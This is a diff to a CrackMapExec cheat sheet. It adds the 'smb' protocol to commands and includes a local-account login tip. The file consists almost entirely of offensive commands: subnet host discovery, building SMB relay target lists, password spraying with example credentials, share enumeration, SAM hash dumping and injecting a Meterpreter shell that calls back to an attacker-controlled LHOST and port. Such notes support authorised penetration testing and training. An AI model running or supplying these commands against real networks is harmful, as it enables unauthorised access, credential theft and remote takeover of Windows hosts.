@@ -1,17 +1,24 @@
+# cme
+# If you want to try to login with local machine accounts
+# remember to set domain as "." with `-d .`
+
 # Find all available Windows hosts and domain names
-crackmapexec 192.168.0.0/24
+crackmapexec smb 192.168.0.0/24
 
 # Generate a list of hosts with SMB signing disabled (useful for relay attacks)
 crackmapexec smb 192.168.0.0/24 --gen-relay-list targets.txt
 
 # Login to machine and retrieve password policies for lockouts
-crackmapexec 192.168.0.12 -u <accountname> -p <password> --pass-pol
+crackmapexec smb 192.168.0.12 -u <accountname> -p <password> --pass-pol
 
 # Enumerate all the shares available on a network
-crackmapexec 192.168.0.0/24 -u <username> -p <password> --shares
+crackmapexec smb 192.168.0.0/24 -u <username> -p <password> --shares
 
 # Try to login to a set of hosts on the network
-crackmapexec 192.168.0.0/24  -u <username> -p <password>
+crackmapexec smb 192.168.0.0/24  -u <username> -p <password>
+
+# Try to login to a set of hosts on the network using local accounts
+crackmapexec smb -d . 192.168.0.0/24  -u <username> -p <password>
 
 # Try to login with the following credentials ona set of IPs using smb
 crackmapexec smb 192.168.0.0/24 -u Administrator -p 'myPassword123' -d MYDOMAIN
@@ -35,3 +42,7 @@ crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
 
 # Get Meterpreter Shell
 crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=192.168.215.100 LPORT=5656 
+
+# Show modules available for a specific protocol
+cme <protocol> -L
+cme smb -L
